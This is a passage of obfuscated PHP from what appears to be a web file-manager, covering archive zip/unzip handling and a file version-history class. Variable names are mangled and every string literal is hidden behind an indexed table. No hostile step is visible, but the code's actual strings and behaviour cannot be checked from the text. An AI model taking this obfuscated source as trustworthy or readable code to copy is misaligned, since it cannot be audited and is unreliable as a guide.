!$ÚÜ£°ƒØ[$Ş¢Ä‚°©[219]]) { show_json(LNG($Ş¢Ä‚°©[1232]), !1); } $æ”¡€ïä = self::zipFileList($˜µ†ÙıŞ, $şüŒí‡’); foreach ($æ”¡€ïä as $¨§â¨œ => $†ÖüÛìğ) { $æ”¡€ïä[$¨§â¨œ] = self::iconvSystem($†ÖüÛìğ); } $íñ–ã = get_filename_auto($İâ—±³ . $á¨ÁâÚ…, $Ş¢Ä‚°©[12], $†æø³ğÒ); KodArchive::create(self::iconvSystem($íñ–ã), $æ”¡€ïä); if (!IO::exist($íñ–ã)) { if ($şüŒí‡’) { del_dir($şüŒí‡’); } show_json(LNG($Ş¢Ä‚°©[1233]), !1); } if (!$şüŒí‡’) { return $íñ–ã; } $î¤›¡ıÄ = self::move($íñ–ã, $†­Úüé, $†æø³ğÒ); if ($şüŒí‡’) { del_dir($şüŒí‡’); } if (!$íñ–ã) { show_json(LNG($Ş¢Ä‚°©[1233]), !1); } return $î¤›¡ıÄ; } public static function unzip($¿à†öä”, $­€ß±Ì™, $åïĞ›ßƒ = "\x2d\61", $½Ê”öô” = "\x72\145\x70\154\x61\143\145") { $àßğ˜Ê =& $_SERVER[ò«¥Ê‡å]; $´Î ¦åğ = parent::info($¿à†öä”); if (!$´Î ¦åğ) { show_json(LNG($àßğ˜Ê[1234]), !1); } $¶ÓÙ¤Šğ = IO::infoFullSimple($­€ß±Ì™); if (!$¶ÓÙ¤Šğ) { $­€ß±Ì™ = IO::mkdir($­€ß±Ì™); } if (isset($¶ÓÙ¤Šğ[$àßğ˜Ê[183]]) && trim($¶ÓÙ¤Šğ[$àßğ˜Ê[86]], $àßğ˜Ê[8]) != trim($­€ß±Ì™, $àßğ˜Ê[8])) { $¢äëıÆ = KodIO::make($¶ÓÙ¤Šğ[$àßğ˜Ê[182]]); $‚ã§Á•­ = IO::fileNameAuto($¢äëıÆ, $¶ÓÙ¤Šğ[$àßğ˜Ê[32]], REPEAT_RENAME_FOLDER, !0); $­€ß±Ì™ = IO::mkdir($¢äëıÆ . $‚ã§Á•­); } $åïĞ›ßƒ = $åïĞ›ßƒ && $åïĞ›ßƒ != $àßğ˜Ê[1235] ? @json_decode($åïĞ›ßƒ, !0) : -1; $£¤·ª¼Ü = self::unzipPart($¿à†öä”, $åïĞ›ßƒ); if (!$£¤·ª¼Ü || !IO::exist($£¤·ª¼Ü[$àßğ˜Ê[216]])) { show_json(LNG($àßğ˜Ê[107]), !1); } $Ä¸±ìê = $£¤·ª¼Ü[$àßğ˜Ê[1236]][count($£¤·ª¼Ü[$àßğ˜Ê[1236]]) - 1]; if ($Ä¸±ìê[$àßğ˜Ê[1237]] == -1 || substr($Ä¸±ìê[$àßğ˜Ê[32]], -1, 1) == $àßğ˜Ê[8]) { $¶»³çˆ = $£¤·ª¼Ü[$àßğ˜Ê[1238]] . rand_string(10) . $àßğ˜Ê[8]; mk_dir($¶»³çˆ); $–İÊ¯ï“ = count($£¤·ª¼Ü[$àßğ˜Ê[1236]]) == 1 ? IO::ext($¿à†öä”) : get_path_ext($£¤·ª¼Ü[$àßğ˜Ê[216]]); $õËÊ¡ñ¥ = KodArchive::extract(self::iconvSystem($£¤·ª¼Ü[$àßğ˜Ê[216]]), $¶»³çˆ, $Ä¸±ìê[$àßğ˜Ê[1237]], $‚ã§Á•­, $–İÊ¯ï“); self::unzipErrorCheck($õËÊ¡ñ¥, array($àßğ˜Ê[1239], $¿à†öä”, $–İÊ¯ï“, $­€ß±Ì™, $£¤·ª¼Ü)); Hook::trigger($àßğ˜Ê[1240], $¶»³çˆ); recursion_dir($¶»³çˆ, $ãÙ¡Š¢¨, $“¬Ç¼»˜, 0); $ÙÍúÄ·ä = array_merge($ãÙ¡Š¢¨, $“¬Ç¼»˜); $òüğ²ñ£ = array(); foreach ($ÙÍúÄ·ä as $İ·ã¼õ) { $Ğë¹óº¦ = IO::move(self::iconvApp($İ·ã¼õ), $­€ß±Ì™, $½Ê”öô”); if ($Ğë¹óº¦) { $òüğ²ñ£[] = $Ğë¹óº¦; } } del_dir($¶»³çˆ); } else { $Ğë¹óº¦ = IO::move($£¤·ª¼Ü[$àßğ˜Ê[216]], $­€ß±Ì™, $½Ê”öô”, get_path_this($Ä¸±ìê[$àßğ˜Ê[32]])); if ($Ğë¹óº¦) { $òüğ²ñ£[] = $Ğë¹óº¦; } } return $òüğ²ñ£ ? $òüğ²ñ£ : !1; } public static function unzipList($œü–£Ó) { $¨Ç¤Ú¨ =& $_SERVER[ò«¥Ê‡å]; $˜·Èš¬ = isset($œü–£Ó[$¨Ç¤Ú¨[1241]]) ? $œü–£Ó[$¨Ç¤Ú¨[1241]] : !1; $Í •ñ÷ˆ = isset($œü–£Ó[$¨Ç¤Ú¨[1237]]) ? @json_decode($œü–£Ó[$¨Ç¤Ú¨[1237]], !0) : -1; $òöğ‹¬„ = self::unzipPart($œü–£Ó[$¨Ç¤Ú¨[86]], $Í •ñ÷ˆ); if (!$òöğ‹¬„ || !IO::exist($òöğ‹¬„[$¨Ç¤Ú¨[216]])) { show_json(LNG($¨Ç¤Ú¨[107]), !1); } $¿»Íàı¹ = $òöğ‹¬„[$¨Ç¤Ú¨[1236]][count($òöğ‹¬„[$¨Ç¤Ú¨[1236]]) - 1]; $ú¼“§İ = in_array(IO::ext($òöğ‹¬„[$¨Ç¤Ú¨[216]]), array($¨Ç¤Ú¨[359], $¨Ç¤Ú¨[1242], $¨Ç¤Ú¨[1243], $¨Ç¤Ú¨[1244], $¨Ç¤Ú¨[1245], $¨Ç¤Ú¨[1246])); if (!$˜·Èš¬ && ($¿»Íàı¹[$¨Ç¤Ú¨[1237]] == -1 || $ú¼“§İ)) { $ÇŠÍ¯„İ = $òöğ‹¬„[$¨Ç¤Ú¨[1238]] . get_path_this($òöğ‹¬„[$¨Ç¤Ú¨[216]]) . $¨Ç¤Ú¨[1247]; if (!IO::exist($ÇŠÍ¯„İ)) { $ÍÂ‚ÀĞÅ = $¿»Íàı¹[$¨Ç¤Ú¨[1237]] == -1 ? get_path_ext(IO::pathThis($œü–£Ó[$¨Ç¤Ú¨[86]])) : get_path_ext($òöğ‹¬„[$¨Ç¤Ú¨[216]]); $ºÏïìÜş = KodArchive::listContent(self::iconvSystem($òöğ‹¬„[$¨Ç¤Ú¨[216]]), !0, $ÍÂ‚ÀĞÅ); self::unzipErrorCheck($ºÏïìÜş, array($¨Ç¤Ú¨[1248], $œü–£Ó, $òöğ‹¬„)); @file_put_contents($ÇŠÍ¯„İ, json_encode($ºÏïìÜş[$¨Ç¤Ú¨[1249]])); } return @json_decode(IO::getContent($ÇŠÍ¯„İ), !0); } IO::fileOut($òöğ‹¬„[$¨Ç¤Ú¨[216]], $˜·Èš¬, get_path_this($¿»Íàı¹[$¨Ç¤Ú¨[32]])); die; } private static function zipFileList($Îøßœğè, $ ²Œ…î« = false) { $»Æ¦Ø°¾ =& $_SERVER[ò«¥Ê‡å]; $É¦üâĞ› = array(); foreach ($Îøßœğè as $İºÑÄä) { $—ŒöËë = $İºÑÄä[$»Æ¦Ø°¾[86]]; if ($ ²Œ…î«) { $—ŒöËë = self::copy($İºÑÄä[$»Æ¦Ø°¾[86]], $ ²Œ…î«, $»Æ¦Ø°¾[864]); } else { $ôÓò§Ú† = self::init($İºÑÄä[$»Æ¦Ø°¾[86]]); if ($ôÓò§Ú†->getType() == $»Æ¦Ø°¾[108]) { $—ŒöËë = $ôÓò§Ú†->path; } } if ($—ŒöËë && self::local()->exist($—ŒöËë)) { $É¦üâĞ›[$İºÑÄä[$»Æ¦Ø°¾[86]]] = $—ŒöËë; } } if (!empty($É¦üâĞ›)) { return array_values($É¦üâĞ›); } show_json(LNG($»Æ¦Ø°¾[1212]), !1); } private static function localFilePath($Ä¦Æª¶¡) { $‰º‚¥¯  =& $_SERVER[ò«¥Ê‡å]; $—Á«ç = KodIO::parse($Ä¦Æª¶¡); if ($—Á«ç[$‰º‚¥¯ [33]] == KodIO::KOD_SOURCE) { $ì˜ËØˆ = Model($‰º‚¥¯ [871])->fileInfoGet(KodIO::sourceID($Ä¦Æª¶¡)); if (!$ì˜ËØˆ[$‰º‚¥¯ [86]]) { show_json($‰º‚¥¯ [1250], !1); } $Ä¦Æª¶¡ = $ì˜ËØˆ[$‰º‚¥¯ [86]]; } $Øù‘†ë = self::init($Ä¦Æª¶¡); if ($Øù‘†ë->pathParse[$‰º‚¥¯ [1198]]) { $Ä¦Æª¶¡ = $Øù‘†ë->pathParse[$‰º‚¥¯ [1198]]; $Øù‘†ë = self::init($Ä¦Æª¶¡); } $è†âÄ = $Øù‘†ë->getType(); if ($è†âÄ == $‰º‚¥¯ [108] || $è†âÄ == $‰º‚¥¯ [1251]) { if (!$Øù‘†ë->exist($Øù‘†ë->path)) { show_json(LNG($‰º‚¥¯ [107]), !1); } return $Øù‘†ë->path; } return !1; } public static function unzipPart($Ü–Ïâ§ã, $ŒïæÙ‰ó = -1) { $š ê·‘ı =& $_SERVER[ò«¥Ê‡å]; $–•·õœĞ = IO::pathThis($Ü–Ïâ§ã); if (!$ŒïæÙ‰ó || $ŒïæÙ‰ó == -1) { $±‰ÉÂÏ = array(array($š ê·‘ı[32] => $–•·õœĞ, $š ê·‘ı[1237] => -1)); $±‰ÉÂÏ[0][$š ê·‘ı[1252]] = $±‰ÉÂÏ[0][$š ê·‘ı[32]]; } else { if (is_array($ŒïæÙ‰ó)) { $±‰ÉÂÏ = $ŒïæÙ‰ó; $ä€²¦óÀ = count($±‰ÉÂÏ) - 1; for ($—»¥Ş±› = 0; $—»¥Ş±› <= $ä€²¦óÀ; $—»¥Ş±›++) { $ÜŸÁéË = $±‰ÉÂÏ[$—»¥Ş±›]; $›¿…”ÑŠ = get_path_this($ÜŸÁéË[$š ê·‘ı[32]]) . (checkExtSafe($ÜŸÁéË[$š ê·‘ı[32]]) ? $š ê·‘ı[12] : $š ê·‘ı[1253]); $±‰ÉÂÏ[$—»¥Ş±›][$š ê·‘ı[1252]] = $š ê·‘ı[1254] . intval($ÜŸÁéË[$š ê·‘ı[1237]]) . $š ê·‘ı[432] . $›¿…”ÑŠ; if ($—»¥Ş±› == 0) { continue; } $±‰ÉÂÏ[$—»¥Ş±›][$š ê·‘ı[1252]] = $±‰ÉÂÏ[$—»¥Ş±› - 1][$š ê·‘ı[1252]] . $š ê·‘ı[1255] . $±‰ÉÂÏ[$—»¥Ş±›][$š ê·‘ı[1252]]; } } } if (!is_array($±‰ÉÂÏ) || count($±‰ÉÂÏ) == 0) { return !1; } $œĞÃ²…µ = $±‰ÉÂÏ[count($±‰ÉÂÏ) - 1]; if (!IO::exist($Ü–Ïâ§ã)) { return !1; } $ô›¸ä¼æ = TEMP_FILES . $š ê·‘ı[1256] . kodIO::hashPathSafe($Ü–Ïâ§ã) . $š ê·‘ı[8]; $²Œ±˜Úè = $ô›¸ä¼æ . $œĞÃ²…µ[$š ê·‘ı[1252]]; mk_dir($ô›¸ä¼æ); file_put_contents(TEMP_FILES . $š ê·‘ı[1231], $š ê·‘ı[12]); if (IO::exist($²Œ±˜Úè)) { return array($š ê·‘ı[216] => $²Œ±˜Úè, $š ê·‘ı[1236] => $±‰ÉÂÏ, $š ê·‘ı[1238] => $ô›¸ä¼æ); } $ÏƒãÜ˜‹ = self::localFilePath($Ü–Ïâ§ã); if (!$ÏƒãÜ˜‹) { $ÏƒãÜ˜‹ = $ô›¸ä¼æ . $š ê·‘ı[1257]; if (!IO::exist($ÏƒãÜ˜‹)) { self::copy($Ü–Ïâ§ã, $ô›¸ä¼æ, !1, get_path_this($ÏƒãÜ˜‹)); } } if (!$ÏƒãÜ˜‹ || !IO::exist($ÏƒãÜ˜‹)) { return !1; } if ($œĞÃ²…µ[$š ê·‘ı[1237]] == -1) { return array($š ê·‘ı[216] => $ÏƒãÜ˜‹, $š ê·‘ı[1236] => $±‰ÉÂÏ, $š ê·‘ı[1238] => $ô›¸ä¼æ); } $—¶”ï = $ÏƒãÜ˜‹; foreach ($±‰ÉÂÏ as $—»¥Ş±› => $ÜŸÁéË) { if (!$ÜŸÁéË || $ÜŸÁéË[$š ê·‘ı[1237]] == $š ê·‘ı[1235]) { break; } if (substr($ÜŸÁéË[$š ê·‘ı[32]], -1, 1) == $š ê·‘ı[8]) { break; } $Æ†¹Ö×½ = in_array(get_path_ext($ÜŸÁéË[$š ê·‘ı[1252]]), array($š ê·‘ı[359], $š ê·‘ı[1242], $š ê·‘ı[1243], $š ê·‘ı[1244], $š ê·‘ı[1245], $š ê·‘ı[1246])); $Ğ‰ÅÏô® = $—»¥Ş±› == count($±‰ÉÂÏ) - 1 && $Æ†¹Ö×½; $æË‚õàÍ = $ô›¸ä¼æ . $ÜŸÁéË[$š ê·‘ı[1252]]; $«øÂ€¶ = $ô›¸ä¼æ . get_path_this($ÜŸÁéË[$š ê·‘ı[32]]); if (IO::exist($æË‚õàÍ)) { $—¶”ï = $æË‚õàÍ; continue; } $ÔÒÚãıõ = $—»¥Ş±› == 0 ? get_path_ext($–•·õœĞ) : get_path_ext($—¶”ï); $Ë°Àª› = KodArchive::extract(self::iconvSystem($—¶”ï), $ô›¸ä¼æ, $ÜŸÁéË[$š ê·‘ı[1237]], $ö‡ìÃØ‘, $ÔÒÚãıõ); self::unzipErrorCheck($Ë°Àª›, array($š ê·‘ı[1258], $Ü–Ïâ§ã, $±‰ÉÂÏ, $ÜŸÁéË, $æË‚õàÍ)); if (IO::exist($«øÂ€¶)) { IO::rename($«øÂ€¶, get_path_this($æË‚õàÍ)); } $—¶”ï = $æË‚õàÍ; } $²Œ±˜Úè = $—¶”ï; return array($š ê·‘ı[216] => $—¶”ï, $š ê·‘ı[1236] => $±‰ÉÂÏ, $š ê·‘ı[1238] => $ô›¸ä¼æ); } private static function unzipErrorCheck($Ùóõ©š¾, $†Ã™±¸¡ = false) { $¹®•£›Ö =& $_SERVER[ò«¥Ê‡å]; if ($Ùóõ©š¾[$¹®•£›Ö[1259]]) { return !0; } write_log(array($¹®•£›Ö[1260], $Ùóõ©š¾, $†Ã™±¸¡), $¹®•£›Ö[1261]); show_json($¹®•£›Ö[1262] . json_encode($Ùóõ©š¾[$¹®•£›Ö[1249]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $È¡Ûß©Ş =& $_SERVER[ò«¥Ê‡å]; $‚ğï™· = $GLOBALS[$È¡Ûß©Ş[6]][$È¡Ûß©Ş[91]]; if ($‚ğï™·[$È¡Ûß©Ş[1263]] != 1) { return; } if ($‚ğï™·[$È¡Ûß©Ş[1264]] <= 0) { return; } if (isset($_REQUEST[$È¡Ûß©Ş[1265]]) && $_REQUEST[$È¡Ûß©Ş[1265]] == $È¡Ûß©Ş[90]) { return; } Hook::bind($È¡Ûß©Ş[1266], $È¡Ûß©Ş[1267]); Hook::bind($È¡Ûß©Ş[1268], $È¡Ûß©Ş[1269]); Hook::bind($È¡Ûß©Ş[1270], $È¡Ûß©Ş[1271]); Hook::bind($È¡Ûß©Ş[1272], $È¡Ûß©Ş[1273]); Hook::bind($È¡Ûß©Ş[1274], $È¡Ûß©Ş[1275]); Hook::bind($È¡Ûß©Ş[1276], $È¡Ûß©Ş[1277]); } public static function eventBeforeUpload($±Œ©íë•) { if ($±Œ©íë•[3] && $±Œ©íë•[3] != REPEAT_REPLACE) { return; } $´şË·Ÿî = self::parsePath($±Œ©íë•[0]); if (!$´şË·Ÿî) { return; } self::add($´şË·Ÿî); } public static function eventBeforeEdit($€ê ğ°ª) { $¦¾á¯¥Ñ = self::parsePath($€ê ğ°ª[0]); if (!$¦¾á¯¥Ñ) { return; } self::add($¦¾á¯¥Ñ); } public static function eventBeforeCopyFile($Üá¦²¡—, $â‹Òüğ, $ÓÙÂƒ¨•, $†ß™”İÔ, $¡ÅËÆ”â, $ÈŒáìóÚ) { $é°Ş’¯ =& $_SERVER[ò«¥Ê‡å]; if (isset($ÓÙÂƒ¨•->_data[$é°Ş’¯[1202]]) && $ÓÙÂƒ¨•->_data[$é°Ş’¯[1202]]) { return; } $Øì£†® = $ÓÙÂƒ¨•->getPathOuter($†ß™”İÔ); $¬›â£¹ = self::parsePath($Øì£†®); if (!$¬›â£¹) { return; } self::add($¬›â£¹); } public static function eventBeforeRename($ºÄÙÆÄÙ) { $ŒâğĞòÖ =& $_SERVER[ò«¥Ê‡å]; $õ£ö•¤õ = self::parsePath($ºÄÙÆÄÙ[0]); if (!$õ£ö•¤õ) { return; } $ú¹“ÈÙÛ = self::checkInHistory($õ£ö•¤õ); if (!$ú¹“ÈÙÛ) { return; } if ($ú¹“ÈÙÛ[$ŒâğĞòÖ[33]] == $ŒâğĞòÖ[216]) { $¡Ôü˜« = self::listData($õ£ö•¤õ); if ($¡Ôü˜« && $¡Ôü˜«[$ŒâğĞòÖ[415]]) { self::moveHistory($õ£ö•¤õ, $ºÄÙÆÄÙ[1]); } } else { IO::rename($ú¹“ÈÙÛ[$ŒâğĞòÖ[86]], $ºÄÙÆÄÙ[1]); } } public static function eventBeforeMove($Õéçâ¥×) { $æ¡Ğ‰©¥ =& $_SERVER[ò«¥Ê‡å]; $Üéß‰À = self::parsePath($Õéçâ¥×[0]); if (!$Üéß‰À) { return; } $¼ÜÑÚüÃ = self::parsePath($Õéçâ¥×[1]); if (!$¼ÜÑÚüÃ) { return; } $ÌúËï†· = $Õéçâ¥×[3]; $¥«Àğø = self::checkInHistory($Üéß‰À); if (!$¥«Àğø) { return; } $Äşõı = self::pathHistory($¼ÜÑÚüÃ); if ($¥«Àğø[$æ¡Ğ‰©¥[33]] == $æ¡Ğ‰©¥[216]) { $á…‹ÚÒ» = self::listData($Üéß‰À); $İ›“À¥ = rtrim($¼ÜÑÚüÃ, $æ¡Ğ‰©¥[8]) . $æ¡Ğ‰©¥[8] . ($ÌúËï†· ? $ÌúËï†· : get_path_this($Üéß‰À)); $¡ ‹ÖÛ = self::listData($İ›“À¥); if ($á…‹ÚÒ» && $á…‹ÚÒ»[$æ¡Ğ‰©¥[415]] && $¡ ‹ÖÛ && $¡ ‹ÖÛ[$æ¡Ğ‰©¥[415]]) { return self::clear($Üéß‰À); } if ($á…‹ÚÒ» && $á…‹ÚÒ»[$æ¡Ğ‰©¥[415]]) { self::moveHistory($Üéß‰À, $ÌúËï†·, $Äşõı); } } else { IO::move($¥«Àğø[$æ¡Ğ‰©¥[86]], $Äşõı, !1, $ÌúËï†·); self::clearEmptyFolder(IO::pathFather($¥«Àğø[$æ¡Ğ‰©¥[86]])); } } public static function eventAfterRemove($´äÈ»±, $™±Ú‘ıÄ) { $ÕˆÒŠ¢ =& $_SERVER[ò«¥Ê‡å]; if (!$™±Ú‘ıÄ) { return; } $À°Ê‘Å° = self::parsePath($´äÈ»±[0]); if (!$À°Ê‘Å°) { return; } $£™ÕÕ¥¶ = self::checkInHistory($À°Ê‘Å°); if (!$£™ÕÕ¥¶) { return; } if ($£™ÕÕ¥¶[$ÕˆÒŠ¢[33]] == $ÕˆÒŠ¢[216]) { $ÎÏéÖ•à = self::listData($À°Ê‘Å°, !1); if ($ÎÏéÖ•à && $ÎÏéÖ•à[$ÕˆÒŠ¢[415]]) { self::clear($À°Ê‘Å°, !1); } } else { IO::remove($£™ÕÕ¥¶[$ÕˆÒŠ¢[86]]); self::clearEmptyFolder(IO::pathFather($£™ÕÕ¥¶[$ÕˆÒŠ¢[86]])); } } private static function checkInHistory($à©˜•áá) { $æáÉ§ÛØ = self::pathHistory($à©˜•áá); if (!IO::exist($æáÉ§ÛØ)) { $æáÉ§ÛØ .= $_SERVER[ò«¥Ê‡å][1278]; } return IO::exist($æáÉ§ÛØ) ? IO::info($æáÉ§ÛØ) : !1; } private static function parsePath($µÈ‹šü) { $Ô×¶Ôˆç =& $_SERVER[ò«¥Ê‡å]; if (!$µÈ‹šü) { return !1; } if ($GLOBALS[$Ô×¶Ôˆç[1279]]) { return; } $Í†ßãÊ = KodIO::parse($µÈ‹šü); $½ë¹ÕğÜ = $Í†ßãÊ[$Ô×¶Ôˆç[33]]; $İ‚²­åü = !$½ë¹ÕğÜ || $½ë¹ÕğÜ == KodIO::KOD_IO || $½ë¹ÕğÜ == KodIO::KOD_SHARE_ITEM; if (!$İ‚²­åü || !$Í†ßãÊ[$Ô×¶Ôˆç[1280]]) { return !1; } if (substr($µÈ‹šü, 0, strlen(DATA_PATH . $Ô×¶Ôˆç[1281])) == DATA_PATH . $Ô×¶Ôˆç[1281]) { return !1; } if ($½ë¹ÕğÜ == KodIO::KOD_SHARE_ITEM) { $ú¢êëÉ = IO::init($µÈ‹šü); if ($ú¢êëÉ->pathParse[$Ô×¶Ôˆç[1198]]) { return self::parsePath($ú¢êëÉ->pathParse[$Ô×¶Ôˆç[1198]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $÷¥é¿¢¾ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $Ô×¶Ôˆç[1282]); foreach ($÷¥é¿¢¾ as $Ö…¬ò»¶) { if (!$½ë¹ÕğÜ && substr($µÈ‹šü, 0, strlen($Ö…¬ò»¶)) == $Ö…¬ò»¶) { return !1; } } self::log($GLOBALS[$Ô×¶Ôˆç[1193]] . $Ô×¶Ôˆç[1283] . $µÈ‹šü); return $µÈ‹šü; } private static function pathHistory($´ÙœİÎ¹) { $ËßÙä‡Ö =& $_SERVER[ò«¥Ê‡å]; $Òå†ÑÆ = self::$_historyBase . ltrim(KodIO::clear($´ÙœİÎ¹), $ËßÙä‡Ö[8]); $Òå†ÑÆ = str_replace(array($ËßÙä‡Ö[1284]), array($ËßÙä‡Ö[1285]), $Òå†ÑÆ); return $Òå†ÑÆ; } public static function log($®ßøÒº°) { } public static function historyCount($ï€‹‘Ã¶) { $µÆøš¥ì =& $_SERVER[ò«¥Ê‡å]; $çì¤Ä–ú = array(); $¿èÕîÊ® = array(); foreach ($ï€‹‘Ã¶ as $Ù¥ó­ß») { $·¹§…ÚÛ = get_path_father($Ù¥ó­ß»); if (!$¿èÕîÊ®[$·¹§…ÚÛ]) { $¿èÕîÊ®[$·¹§…ÚÛ] = array(); } $¿èÕîÊ®[$·¹§…ÚÛ][] = get_path_this($Ù¥ó­ß»); } foreach ($¿èÕîÊ® as $·¹§…ÚÛ => $şıôó•ï) { $¹«Ÿ‰¬ = self::parsePath($·¹§…ÚÛ); if (!$¹«Ÿ‰¬) { continue; } foreach ($şıôó•ï as $²ôŠ÷•Õ) { $Ê¨¨±Ûï = self::listData(rtrim($¹«Ÿ‰¬, $µÆøš¥ì[8]) . $µÆøš¥ì[8] . $²ôŠ÷•Õ, !1); if ($Ê¨¨±Ûï && $Ê¨¨±Ûï[$µÆøš¥ì[415]]) { $çì¤Ä–ú[rtrim($·¹§…ÚÛ, $µÆøš¥ì[8]) . $µÆøš¥ì[8] . $²ôŠ÷•Õ] = count($Ê¨¨±Ûï[$µÆøš¥ì[415]]); } } } return $çì¤Ä–ú; } public static function add($Òƒñ¦±Ö) { $°şò¿şï =& $_SERVER[ò«¥Ê‡å]; $‹Íà˜Î± = self::listData($Òƒñ¦±Ö); if (!$‹Íà˜Î±) { return; } $ï—·Á = Model($°şò¿şï[809])->get($°şò¿şï[1286]); $÷ÁêÑ¤¥ = intval($GLOBALS[$°şò¿şï[6]][$°şò¿şï[91]][$°şò¿şï[1264]]); $õê¦Íı‘ = $ï—·Á == $°şò¿şï[1287] ? min(5, $÷ÁêÑ¤¥) : $÷ÁêÑ¤¥; if ($÷ÁêÑ¤¥ <= 0) { return; } $”†¾¡Í¨ = IO::info($Òƒñ¦±Ö); $öÉó”Ù = $‹Íà˜Î±[$°şò¿şï[415]]; if ($”†¾¡Í¨[$°şò¿şï[78]] == 0) { return; } if ($”†¾¡Í¨[$°şò¿şï[78]] >= 1024 * 1024 * 500) { return !1; } $¬Ø²êÎ¼ = IO::hashSimple($Òƒñ¦±Ö); if ($öÉó”Ù && $öÉó”Ù[0][$°şò¿şï[642]] == $¬Ø²êÎ¼) { return !0; } if (array_key_exists($°şò¿şï[219], $”†¾¡Í¨) && !$”†¾¡Í¨[$°şò¿şï[219]]) { return !1; } $—ãİ¥¥ = short_id(time()); $ıÏ‡ç´œ = array($°şò¿şï[445] => $—ãİ¥¥, $°şò¿şï[642] => $¬Ø²êÎ¼, $°şò¿şï[32] => $”†¾¡Í¨[$°şò¿şï[32]] . $°şò¿şï[10] . date($°şò¿şï[1288]) . rand_string(1), $°şò¿şï[78] => $”†¾¡Í¨[$°şò¿şï[78]], $°şò¿şï[497] => USER_ID, $°şò¿şï[217] => time(), $°şò¿şï[1289] => $°şò¿şï[12]); IO::mkdir($‹Íà˜Î±[$°şò¿şï[1290]]); $—õƒº = IO::copy($Òƒñ¦±Ö, $‹Íà˜Î±[$°şò¿şï[1290]], !1, $ıÏ‡ç´œ[$°şò¿şï[32]]); if (!$—õƒº) { self::clearEmptyFolder($‹Íà˜Î±[$°şò¿şï[1290]]); return !1; } array_unshift($öÉó”Ù, $ıÏ‡ç´œ); if (count($öÉó”Ù) > $õê¦Íı‘) { $èÅºó“Å = array_slice($öÉó”Ù, $õê¦Íı‘); foreach ($èÅºó“Å as $Œ­ÜµŒ) { IO::remove($‹Íà˜Î±[$°şò¿şï[1290]] . $Œ­ÜµŒ[$°şò¿şï[32]]); } $öÉó”Ù = array_slice($öÉó”Ù, 0, $õê¦Íı‘); } return self::saveData($‹Íà˜Î±[$°şò¿şï[1291]], $öÉó”Ù); } public static function remove($»ÈË¦÷›, $âÄä’‡ã) { $â»Ó¤Ç =& $_SERVER[ò«¥Ê‡å]; $Ëñß­Ö = self::listData($»ÈË¦÷›); $¹«Š»ÓÆ = array(); if (!$Ëñß­Ö) { return !1; } foreach ($Ëñß­Ö[$â»Ó¤Ç[415]] as $ó¾¸ƒÖ) { if ($ó¾¸ƒÖ[$â»Ó¤Ç[445]] == $âÄä’‡ã) { IO::remove($Ëñß­Ö[$â»Ó¤Ç[1290]] . $ó¾¸ƒÖ[$â»Ó¤Ç[32]]); continue; } $¹«Š»ÓÆ[] = $ó¾¸ƒÖ; } return self::saveData($Ëñß­Ö[$â»Ó¤Ç[1291]], $¹«Š»ÓÆ); } public static function clear($¥‘ê™á, $°Ì©•â = true) { $‚û£™Ôª =& $_SERVER[ò«¥Ê‡å]; $Ôºı¨¼ = self::listData($¥‘ê™á, $°Ì©•â); if (!$Ôºı¨¼) { return !1; } foreach ($Ôºı¨¼[$‚û£™Ôª[415]] as $ŒëËã é) { IO::remove($Ôºı¨¼[$‚û£™Ôª[1290]] . $ŒëËã é[$‚û£™Ôª[32]]); } return self::saveData($Ôºı¨¼[$‚û£™Ôª[1291]], array()); } public static function moveHistory($Ú‹Ç¡Ó¬, $À‰ìıïõ = '', $ê·Ä€˜­ = '') { $¦Òºæ¨À =& $_SERVER[ò«¥Ê‡å]; $áÑ½åÂ€ = self::listData($Ú‹Ç¡Ó¬, !1); if (!$áÑ½åÂ€ || !$áÑ½åÂ€[$¦Òºæ¨À[415]]) { return !1; } $äàÆåğÓ = $¦Òºæ¨À[1278]; $À‰ìıïõ = $À‰ìıïõ ? $À‰ìıïõ : get_path_this($Ú‹Ç¡Ó¬); $ê·Ä€˜­ = $ê·Ä€˜­ ? $ê·Ä€˜­ : $áÑ½åÂ€[$¦Òºæ¨À[1290]]; $Ÿñ ‹¡ª = substr(get_path_this($áÑ½åÂ€[$¦Òºæ¨À[1291]]), 0, -strlen($äàÆåğÓ)); foreach ($áÑ½åÂ€[$¦Òºæ¨À[415]] as $âà¸Ú®ù => $§£ä‚¬…) { $ÙÖ·½Éú = $À‰ìıïõ . substr($§£ä‚¬…[$¦Òºæ¨À[32]], strlen($Ÿñ ‹¡ª)); $·³´‚§‚ = IO::move($áÑ½åÂ€[$¦Òºæ¨À[1290]] . $§£ä‚¬…[$¦Òºæ¨À[32]], $ê·Ä€˜­, !1, $ÙÖ·½Éú); if ($·³´‚§‚) { $áÑ½åÂ€[$¦Òºæ¨À[415]][$âà¸Ú®ù][$¦Òºæ¨À[32]] = $ÙÖ·½Éú; } } $áÑ½åÂ€[$¦Òºæ¨À[1291]] = IO::move($áÑ½åÂ€[$¦Òºæ¨À[1291]], $ê·Ä€˜­, !1, $À‰ìıïõ . $äàÆåğÓ); self::saveData($áÑ½åÂ€[$¦Òºæ¨À[1291]], $áÑ½åÂ€[$¦Òºæ¨À[415]]); self::clearEmptyFolder($áÑ½åÂ€[$¦Òºæ¨À[1290]]); } public static function rollback($²áÀúµ, $à¹ÛİÜ£) { $£¯Ê¦—È =& $_SERVER[ò«¥Ê‡å]; $Æ½§òñ´ = self::listData($²áÀúµ); if (!$Æ½§òñ´) { return; } $«ó›ñÏ = IO::info($²áÀúµ); foreach ($Æ½§òñ´[$£¯Ê¦—È[415]] as $Ë€¤Ö—Œ => $„¬“ÉæÀ) { if ($„¬“ÉæÀ[$£¯Ê¦—È[445]] == $à¹ÛİÜ£) { self::add($²áÀúµ); $Šë’å§â = $Æ½§òñ´[$£¯Ê¦—È[1290]] . $„¬“ÉæÀ[$£¯Ê¦—È[32]]; $û‹ºƒª· = IO::copy($Šë’å§â, IO::pathFather($²áÀúµ), REPEAT_REPLACE, $«ó›ñÏ[$£¯Ê¦—È[32]]); if ($û‹ºƒª·) { self::remove($²áÀúµ, $à¹ÛİÜ£); } return $û‹ºƒª·; } } return !1; } public static function setDetail($ê™¸Ä—, $Ò²’Óşû, $¬ŸÍ×êñ) { $Ğô¬Ç´Å =& $_SERVER[ò«¥Ê‡å]; $ƒéàÚŒ = self::listData($ê™¸Ä—); if (!$ƒéàÚŒ) { return; } foreach ($ƒéàÚŒ[$Ğô¬Ç´Å[415]] as $ĞÄãıÉ => $ÜıÔİİæ) 